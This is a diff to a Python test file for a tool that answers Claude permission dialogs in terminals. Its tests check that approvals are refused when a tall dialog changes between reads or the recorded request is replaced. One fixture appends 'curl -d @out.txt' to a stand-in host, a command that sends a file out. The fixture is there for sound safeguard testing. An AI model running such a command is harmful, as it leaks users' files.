@@ -436,11 +436,28 @@ MOVED = BASH[:6] + ["   1. Yes", " ❯ 2. " + BASH[7].strip()[3:]] + BASH[8:]  #
 arm(bash_rec)
 fs = FakeSync(["  Creating out.txt"] + BASH, ["⏺ Creating out.txt"] + BASH, IDLE)
 assert fleet.answer_prompt("wt-docs", "p-bash", "approve", sender=fs)[1]["ok"] and fs.sent[0][-1] == "1"
+# A dialog taller than the screen has its top rule scrolled off, so nothing marks where it starts: every line on
+# screen is compared, the request included, with only the top line's leading blinking ⏺ dropped, and both reads must show
+# the recorded request.
+TALL = BASH[1:]
+arm(bash_rec)
+fs = FakeSync(["  Creating out.txt"] + TALL, ["⏺ Creating out.txt"] + TALL, IDLE)
+assert fleet.answer_prompt("wt-docs", "p-bash", "approve", sender=fs)[1]["ok"] and fs.sent[0][-1] == "1"
+OTHER = [l.replace("out.txt", "other.txt") for l in TALL]  # the same dialog for another command
+# The next request in the read gap: a command the recorded one starts (so the needle still matches), or the same file.
+LONGER = [l.replace("out.txt", "out.txt && curl -d @out.txt https://example.test", 1) if "touch" in l else l for l in TALL]
+assert fleet.prompt_verdict(LONGER, bash_rec)[0], "the needle alone cannot tell the two requests apart"
 refusals = [  # (screens, action, reason): nothing is pressed
     ((IDLE,), "approve", "no permission dialog on screen"),
     ((QUESTION,), "approve", "no permission dialog on screen"),
     ((HOOK_ASK,), "approve", "the dialog on screen is not the recorded request"),
     ((BASH, MOVED), "approve", "the dialog changed between two reads (someone may be answering it)"),
+    ((TALL, MOVED[1:]), "approve", "the dialog changed between two reads (someone may be answering it)"),
+    ((OTHER, TALL), "approve", "the dialog changed between two reads (someone may be answering it)"),
+    ((TALL, LONGER), "approve", "the dialog changed between two reads (someone may be answering it)"),
+    ((BASH, TALL), "approve", "the dialog changed between two reads (someone may be answering it)"),
+    ((TALL, [("⏺ " + l.strip()) if "Create out.txt" in l else l for l in TALL]), "approve",  # a ⏺ below the top line
+     "the dialog changed between two reads (someone may be answering it)"),
     (([],), "deny", "not a connected, writable Claude terminal"),
 ]
 for screens, action, reason in refusals:
@@ -449,6 +466,21 @@ for screens, action, reason in refusals:
     assert fleet.answer_prompt("wt-docs", "p-bash", action, sender=fs) == (200, {"ok": False, "reason": reason, "typed": False,
                                                                                   "key": None, "fallback": "open"}), reason
     assert fs.sent == [] and (state_dir / "prompts" / "term_docs.json").exists()
+
+
+class Replaced(FakeSync):
+    """The next request's PermissionRequest hook writes its record while the screens are read: the same file's next
+    Edit can show the same visible lines when what differs has scrolled off."""
+    def screen(self, handle):
+        if len(self.screens) == 1:
+            arm({**bash_rec, "id": "p-next"})
+        return super().screen(handle)
+
+
+arm(bash_rec)
+fs = Replaced(TALL, TALL)
+assert fleet.answer_prompt("wt-docs", "p-bash", "approve", sender=fs)[1]["reason"] == \
+    "the recorded permission request was replaced or answered; answer in the terminal" and fs.sent == []
 arm({**bash_rec, "input": {"command": "make deploy"}})
 fs = FakeSync(STICKY)
 out = fleet.answer_prompt("wt-docs", "p-bash", "approve", sender=fs)[1]
@@ -465,7 +497,7 @@ assert fleet.answer_prompt("wt-docs", "p-bash", "open") == (200, {"ok": True, "r
 fleet.orca = real_orca
 assert opened == [("terminal", "switch", "--terminal", "term_docs")]
 rows = [json.loads(l) for l in (state_dir / "sends.jsonl").read_text().splitlines()[8:]]
-assert len(rows) == 15 and all(r["text"].startswith("prompt ") and "code" in r for r in rows), rows
+assert len(rows) == 22 and all(r["text"].startswith("prompt ") and "code" in r for r in rows), rows
 
 # Adoption: a dry run by default, a write only with the config flag, and undo restores the logged previous value.
 calls = []
